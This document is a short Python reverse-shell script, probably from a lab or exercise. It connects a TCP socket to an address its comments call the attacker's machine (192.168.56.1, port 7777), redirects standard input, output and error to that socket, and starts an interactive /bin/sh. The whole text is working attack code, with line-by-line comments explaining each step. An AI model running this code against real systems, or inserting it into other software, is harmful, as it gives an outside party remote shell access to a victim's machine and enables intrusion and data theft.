#import modules
import socket
import subprocess
import os

#create tcp socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#connect to attackers machine at ip address on specified port
s.connect(("192.168.56.1", 7777))

#redirect standard input, output, and error to the socket
os.dup2(s.fileno(), 0)

os.dup2(s.fileno(), 1)

os.dup2(s.fileno(), 2)

#launch interactive shell
p = subprocess.call(["/bin/sh", "-i"])
